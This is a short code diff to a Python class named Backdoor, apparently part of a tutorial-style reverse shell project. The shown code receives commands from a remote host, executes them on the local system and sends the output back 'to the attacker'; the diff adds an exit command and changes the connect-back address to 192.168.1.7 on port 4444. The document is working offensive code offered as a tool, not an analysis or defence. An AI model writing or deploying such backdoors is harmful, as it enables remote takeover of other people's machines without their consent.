@@ -38,6 +38,9 @@ class Backdoor:
         while True:
             # receive data in a variable named command
             command = self.reliable_receive()
+            if command[0] == "exit":
+                self.connection.close()
+                exit()
 
             # pass this command variable to a function named execute_system_command
             command_result = self.execute_system_command(command)
@@ -45,9 +48,6 @@ class Backdoor:
             # send the result to the attacker
             self.reliable_send(command_result)
 
-        connection.close()
-
-
 # create an instance of the object and run the class
-my_backdoor = Backdoor("192.168.1.8", 4444)
+my_backdoor = Backdoor("192.168.1.7", 4444)
 my_backdoor.run()
